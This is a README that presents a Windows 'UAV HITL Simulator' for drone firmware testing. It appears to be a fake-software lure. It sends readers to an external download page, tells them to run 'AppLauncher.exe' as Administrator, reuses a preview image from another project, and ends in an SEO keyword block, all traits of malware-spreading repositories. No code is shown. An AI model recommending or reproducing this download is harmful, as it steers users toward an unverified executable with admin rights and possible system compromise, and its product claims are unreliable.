<h1 align="center">🛩️ UAV HITL Simulator</h1>

<p align="center">
  <a href="https://uav-hitl-simulator-download.github.io/.github/" target="_blank">
    <img src="https://img.shields.io/badge/⬇️%20Download%20UAV%20HITL%20Simulator-Windows%20Version-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
         alt="Download UAV HITL Simulator for Windows" 
         style="width: 540px; height: 43px;">
  </a>
</p>

---

## 📌 About the Tool

**UAV HITL Simulator** is a professional **hardware-in-the-loop** environment for validating drone firmware and control stacks on a real flight controller, safely on the bench.  
It emulates sensors and environment physics in real time, exchanges **MAVLink** over serial/UDP, and lets you test failsafes, tuning, and mission logic without risking your airframe.

---

## ⚙️ Key Features

- 🧭 **Sensor emulation:** IMU (accel/gyro), magnetometer, barometer, GPS with noise/bias models  
- 🚀 **Vehicle dynamics:** multirotor, fixed-wing, VTOL, rover; adjustable mass, inertia, prop/motor maps  
- 🌬️ **Environment:** wind, turbulence, gusts, altitude/temperature models, ground effect (basic)  
- 🔌 **I/O bridges:** MAVLink serial/UDP, RC link passthrough, SITL↔HITL bridge, log/telemetry recorder  
- ⏱️ **Timing/latency:** loop-rate control, deterministic stepping, latency/jitter injection, sensor dropouts  
- 🧪 **Scenarios:** mission playback, GPS loss, magnetometer drift, baro bias, battery sag  
- 🗺️ **Integrations:** works alongside Gazebo / Unreal / FlightGear (external visualization optional)  
- 🧰 **Profiles:** ready presets for PX4 / ArduPilot targets + custom vehicle profiles  
- 📈 **Analysis:** live plots (attitude, rates, vibrations), PX4/ArduPlot logs export (ULog/DF)  

---

## 💡 System Compatibility

Windows 10 / Windows 11 ✅  
Serial (COM) and UDP support out of the box  

---

## 🧩 How to Use

1. Extract the archive to a new folder  
2. Run **AppLauncher.exe** as Administrator  
3. Connect the flight controller via USB (select detected **COM** port)  
4. Choose **Firmware Profile** (PX4 / ArduPilot) and **Vehicle Model**  
5. Set environment (wind, turbulence) and sensor noise levels  
6. Click **Start Simulation** → arm in your GCS and validate behavior  
7. Use **Record** to capture logs, then **Stop** to export results  

---

## 🖼️ Visual Preview

<p align="center">
  <img src="https://github.com/ZilantRobotics/innopolis_vtol_dynamics/wiki/assets/welcome/use_case_2_rviz.gif" alt="UAV HITL Simulator Preview" width="700"/>
</p>

---

## 📢 Notes

- Use stable USB cables; disable power-saving on USB hubs for consistent timing  
- For PX4: set `SYS_HITL=1` (or use the provided preset) before arming  
- For ArduPilot: load a HITL-capable firmware target / enable HITL parameters  
- External visualizers (Gazebo/Unreal/FlightGear) are optional; the simulator runs headless

---

## 🧠 Note

If the board is not detected, install the included USB drivers from the **Drivers** folder, then restart **AppLauncher.exe**.  
For UDP, ensure your firewall allows inbound on the selected port.

---

<!-- Hidden Badges -->
<p align="center">
  <img src="https://img.shields.io/badge/Tool-UAV%20HITL%20Simulator-blue?style=flat-square"/>
  <img src="https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square"/>
  <img src="https://img.shields.io/badge/Category-Flight%20Testing-green?style=flat-square"/>
</p>

---

### 📄 License

MIT License – for simulation and educational use only.

---

### 🤝 Support & Contributions

Issues and PRs for new airframes, sensor models, and timing improvements are welcome.  
Share presets for your FC targets, mixer configs, and validated dynamics parameters.

---

## 🔍 SEO Keywords
```md
uav hitl simulator download, drone hitl windows, px4 hitl tool, ardupilot hitl simulator, mavlink hitl bridge, imu gps barometer emulation, quadcopter hitl physics, fixed wing hitl simulator, uav latency injection, drone bench testing software, uav dynamics model windows, flight controller hitl, rc link passthrough, sitl to hitl bridge, uav telemetry logger
